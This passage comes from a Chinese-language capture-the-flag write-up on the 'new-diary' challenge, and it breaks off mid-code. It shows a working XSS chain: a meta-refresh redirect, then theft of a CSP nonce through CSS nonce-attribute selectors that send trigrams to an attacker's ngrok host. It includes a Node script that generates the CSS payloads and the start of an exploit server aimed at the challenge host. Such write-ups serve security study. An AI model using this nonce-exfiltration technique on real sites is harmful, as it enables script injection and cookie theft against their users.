class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"report"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/report?id=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>id<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&amp;username=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>username<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    window<span class="token punctuation">.</span><span class="token function">removeEventListener</span><span class="token punctuation">(</span><span class="token string">'hashchange'</span><span class="token punctuation">,</span> load<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'hashchange'</span><span class="token punctuation">,</span> load<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>這邊值得注意的一點是如果改變 hash 的話會載入新的 note，這點滿重要的。</p><p>而 CSP 的部份如下：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span>    <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>script-src 'nonce-&lt;%= nonce %>'; frame-src 'none'; object-src 'none'; base-uri 'self'; style-src 'unsafe-inline' https://unpkg.com<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>每一個 response 都有不同的 nonce，長度為 32 位，每一個字元是 a-zA-Z0-9，有 36 種組合。CSS 的部分允許 inline 跟 unpkg，因為 unpkg 就只是去 npm 上拿，所以可以想成是允許任何的外部 style。</p><p>admin bot 的部份只能訪問 <code>/share/read</code>，訪問後會停留 30 秒，這個 timeout 應該滿明顯是要花時間 leak 什麼東西：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://localhost/share/read#id=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>id<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&amp;username=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>username<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>  <span class="token punctuation">&#123;</span> <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">5000</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> <span class="token number">30000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>對了，flag 在 cookie 裡面，所以目標是 XSS。</p><p>其實看完題目之後我覺得滿直覺的，很明顯要想辦法用 CSS 偷到 nonce，偷到 nonce 以後建立一個新的 note，然後改變 hash 去載入新的 note，就可以 XSS。</p><p>但有一些小細節要注意就是了，像是 admin bot 只能訪問某一個筆記，所以要先用 <code>&lt;meta&gt;</code> redirect 到自己的 server，再用 <code>window.open</code> 去打開新的筆記，這樣偷到 nonce 以後才能藉由改變 hash 去更新內容，確保 nonce 不會變。</p><p>總之呢，流程如下：</p><ol><li>新增一個 note，內容為 <code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;URL=https://my_server&quot;&gt;</code>，id 是 0</li><li>新增另一個 note，內容為 <code>&lt;style&gt;@import &quot;https://unpkg.com/pkg/steal.css&quot;&lt;/style&gt;</code>，id 是 1</li><li>讓 admin bot 訪問 id 是 0 的 note</li><li>admin bot 被導到 my server，此時可以在我的 origin 執行任意 JavaScript</li><li>執行 <code>w = window.open(note_1)</code>，開始偷 nonce</li><li>拿到偷來的 nonce</li><li>新增最後一個 note，內容為 <code>&lt;script nonce=xxx&gt;&lt;/script&gt;</code>，id 為 2</li><li>執行 <code>w.location = &#39;.../share/read#id=2&#39;</code></li><li>XSS</li></ol><p>這之中最麻煩的部分就在於用 CSS 偷 nonce 了。</p><h3><span id="用-css-偷-nonce">用 CSS 偷 nonce</span></h3><p>我以前剛好有研究過用 CSS 偷東西：<a href="https://blog.huli.tw/2022/09/29/css-injection-1/">用 CSS 來偷資料 - CSS injection（上）</a>，但裡面講到的做法其實這一題行不通。</p><p>由於 nonce 的可能性有太多種，所以一個字元一個字元偷是最快的方法，但這種做法要利用 <code>@import</code> 加上 blocking 的方式，這一題的外部連結只能到 unpkg，是靜態檔案，沒辦法。</p><p>另一種做法剛好前陣子才看過但還沒更新到文章：<a href="https://www.sonarsource.com/blog/code-vulnerabilities-leak-emails-in-proton-mail/#splitting-the-url-into-smaller-chunks">Code Vulnerabilities Put Proton Mails at Risk</a></p><p>這做法滿聰明的，把一段字切成很多小字串，每個字串有三個字元，我們對 a-zA-Z0-9 做三個字的全排列組合，像這樣：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">script[nonce*="aaa"]</span><span class="token punctuation">&#123;</span><span class="token property">--aaa</span><span class="token punctuation">:</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">"https://server/leak?q=aaa"</span><span class="token punctuation">)</span></span><span class="token punctuation">&#125;</span><span class="token selector">script[nonce*="aab"]</span><span class="token punctuation">&#123;</span><span class="token property">--aab</span><span class="token punctuation">:</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">"https://server/leak?q=aab"</span><span class="token punctuation">)</span></span><span class="token punctuation">&#125;</span><span class="token selector">...script[nonce*="ZZZ"]</span><span class="token punctuation">&#123;</span><span class="token property">--ZZZ</span><span class="token punctuation">:</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">"https://server/leak?q=ZZZ"</span><span class="token punctuation">)</span></span><span class="token punctuation">&#125;</span><span class="token selector">script</span><span class="token punctuation">&#123;</span>  <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>  <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token function">-webkit-cross-fade</span><span class="token punctuation">(</span>    <span class="token function">var</span><span class="token punctuation">(</span>--aaa<span class="token punctuation">,</span> none<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">-webkit-cross-fade</span><span class="token punctuation">(</span>      <span class="token function">var</span><span class="token punctuation">(</span>--aab<span class="token punctuation">,</span> none<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">var</span><span class="token punctuation">(</span>--ZZZ<span class="token punctuation">,</span> none<span class="token punctuation">)</span><span class="token punctuation">,</span> 50%    <span class="token punctuation">)</span><span class="token punctuation">,</span>    50%  <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用 <code>-webkit-cross-fade</code> 是為了要載入多個圖片，細節可以參考上面貼的文章。</p><p>例如說 nonce 是 abc123 好了，server 就會收到：</p><ol><li>abc</li><li>bc1</li><li>c12</li><li>123</li></ol><p>這四種字串，而順序可能會不一樣，但只要按照規則組合起來，就可以得到 abc123。當然，也有可能會有多種組合或是不確定頭尾的情形，但那就當作 edge case，重新再試一次就行了。</p><p>用這樣的方式偷 nocne，以這題來說會有 36^3 &#x3D; 46656 個規則，是可以接受的長度。</p><h3><span id="產生-css">產生 CSS</span></h3><p>剛好之前在工作上也碰到類似的情境，所以手邊已經有寫好的腳本了，改一下就可以用。</p><p>這題如果把全部規則都套在同一個元素上，似乎會因為規則太多之類的讓 Chrome 直接 crash（至少我本地是這樣），所以我就把規則分三份，順便套在三個不同元素。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token keyword">let</span> chars <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789'</span><span class="token keyword">const</span> host <span class="token operator">=</span> <span class="token string">'https://ip.ngrok-free.app'</span><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> a <span class="token keyword">of</span> chars<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> b <span class="token keyword">of</span> chars<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> c <span class="token keyword">of</span> chars<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> str <span class="token operator">=</span> a<span class="token operator">+</span>b<span class="token operator">+</span>c<span class="token punctuation">;</span>            arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">let</span> payload1 <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">let</span> crossPayload1 <span class="token operator">=</span> <span class="token string">'url("/")'</span><span class="token keyword">let</span> payload2 <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">let</span> crossPayload2 <span class="token operator">=</span> <span class="token string">'url("/")'</span><span class="token keyword">let</span> payload3 <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">let</span> crossPayload3 <span class="token operator">=</span> <span class="token string">'url("/")'</span><span class="token keyword">const</span> third <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span>length <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> arr1 <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> third<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">const</span> arr2 <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>third<span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">*</span> third<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">const</span> arr3 <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> third<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> str <span class="token keyword">of</span> arr1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    payload1 <span class="token operator">+=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">script[nonce*="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"]&#123;--</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">:url("</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>host<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/leak?q=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">")&#125;\n</span><span class="token template-punctuation string">`</span></span>    crossPayload1 <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">-webkit-cross-fade(</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>crossPayload1<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, var(--</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, none), 50%)</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">&#125;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> str <span class="token keyword">of</span> arr2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    payload2 <span class="token operator">+=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">script[nonce*="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"]&#123;--</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">:url("</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>host<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/leak?q=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">")&#125;\n</span><span class="token template-punctuation string">`</span></span>    crossPayload2 <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">-webkit-cross-fade(</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>crossPayload2<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, var(--</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, none), 50%)</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">&#125;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> str <span class="token keyword">of</span> arr3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    payload3 <span class="token operator">+=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">script[nonce*="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"]&#123;--</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">:url("</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>host<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/leak?q=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">")&#125;\n</span><span class="token template-punctuation string">`</span></span>    crossPayload3 <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">-webkit-cross-fade(</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>crossPayload3<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, var(--</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, none), 50%)</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">&#125;</span>payload1 <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>payload1<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> script&#123;display:block;&#125; script&#123;background-image: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>crossPayload1<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&#125;</span><span class="token template-punctuation string">`</span></span>payload2 <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>payload2<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">script:after&#123;content:'a';display:block;background-image:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>crossPayload2<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> &#125;</span><span class="token template-punctuation string">`</span></span>payload3 <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>payload3<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">script:before&#123;content:'a';display:block;background-image:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>crossPayload3<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> &#125;</span><span class="token template-punctuation string">`</span></span>fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token string">'exp1.css'</span><span class="token punctuation">,</span> payload1<span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token string">'exp2.css'</span><span class="token punctuation">,</span> payload2<span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token string">'exp3.css'</span><span class="token punctuation">,</span> payload3<span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接著把跑完的檔案發佈到 npm，就有一個 unpkg 的網址了。</p><h3><span id="exploit">Exploit</span></h3><p>寫得滿亂的有點懶得整理，但基本上跑起來以後訪問 <code>/start</code> 就會開始自動跑整個流程。</p><p>這題因為運氣好之前就有看過那篇文章，所以開賽後半小時就大概知道怎麼解了，剩下兩小時都在寫 code 😆</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> express <span class="token keyword">from</span> <span class="token string">'express'</span><span class="token keyword">import</span> <span class="token punctuation">&#123;</span>fetch<span class="token punctuation">,</span> CookieJar<span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"node-fetch-cookies"</span><span class="token punctuation">;</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">const</span> port <span class="token operator">=</span> <span class="token number">3000</span><span class="token keyword">const</span> host <span class="token operator">=</span> <span class="token string">'http://new-diary.ctf.0ops.sjtu.cn'</span><span class="token keyword">const</span> selfHost <span class="token operator">=</span> <span class="token string">'https://ip.ngrok-free.app'</span><span class="token keyword">const</span> cssUrl <span class="token operator">=</span> <span class="token string">'https://unpkg.com/your_pkg@1.0.0'</span><span class="token keyword">const</span> <span class="token function-variable function">getRandomStr</span> <span class="token operator">=</span> <span class="token parameter">len</span> <span class="token operator">=></span> <span class="token function">Array</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">_</span> <span class="token operator">=></span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">let</span> leaks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">let</span> cookieJar <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CookieJar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> username <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token keyword">let</span> hasToken <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">mergeWords</span><span class="token punctuation">(</span><span class="token parameter">arr<span class="token punctuation">,</span> ending</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> ending  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ending<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">let</span> isFound <span class="token operator">=</span> <span class="token boolean">false</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">===</span> j<span class="token punctuation">)</span> <span class="token keyword">continue</span>        <span class="token keyword">let</span> suffix <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>         <span class="token keyword">let</span> prefix <span class="token operator">=</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>suffix <span class="token operator">===</span> prefix<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          isFound <span class="token operator">=</span> <span class="token boolean">true</span>          <span class="token keyword">continue</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>isFound<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'ending:'</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token function">mergeWords</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">item</span> <span class="token operator">=></span> item<span class="token operator">!==</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Error, please try again'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">let</span> found <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> length <span class="token operator">=</span> ending<span class="token punctuation">.</span>length    <span class="token keyword">let</span> suffix <span class="token operator">=</span> ending<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> ending<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">let</span> prefix <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>suffix <span class="token operator">===</span> prefix<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      found<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">[</span>arr<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">item</span> <span class="token operator">=></span> item<span class="token operator">!==</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> ending<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> found<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">mergeWords</span><span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> item<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">handleLeak</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> str <span class="token operator">=</span> <span class="token string">''</span>  <span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span>leaks<span class="token punctuation">]</span>  leaks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'received:'</span><span class="token punctuation">,</span> arr<span class="token punctuation">)</span>  <span class="token keyword">const</span> merged <span class="token operator">=</span> <span class="token function">mergeWords</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'leaked:'</span><span class="token punctuation">,</span> merged<span class="token punctuation">.</span><span class="token function">flat</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> merged<span class="token punctuation">.</span><span class="token function">flat</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">createNote</span><span class="token punctuation">(</span><span class="token parameter">title<span class="token punctuation">,</span> content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span>cookieJar<span class="token punctuation">,</span> host <span class="token operator">+</span> <span class="token string">'/write'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>    <span class="token literal-property 